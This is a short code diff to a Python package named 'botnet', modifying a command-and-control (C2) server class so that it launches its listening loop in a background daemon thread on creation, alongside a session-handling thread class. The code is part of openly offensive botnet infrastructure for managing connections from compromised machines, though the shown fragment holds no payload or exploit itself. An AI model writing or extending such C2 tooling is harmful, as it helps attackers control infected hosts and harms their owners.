@@ -9,11 +9,12 @@ from datetime import datetime
 from botnet import utils
 
 class C2():
-    def __init__(self, host='0.0.0.0', port=1337, debug=False):
+    def __init__(self, host='0.0.0.0', port=1337):
         self.host = host
         self.port = port
         self.sessions = {}
         self.socket = self._init_socket()
+        self.run()
 
     def _init_socket(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -42,6 +43,10 @@ class C2():
             else:
                 utils.log("Failed Connection: {}".format(address[0]))
 
+    def run(self):
+        thread = threading.Thread(target=self.serve_until_stopped)
+        thread.daemon = True
+        thread.start()
 
 class SessionThread(threading.Thread):
     def __init__(self, connection=None, c2=None):
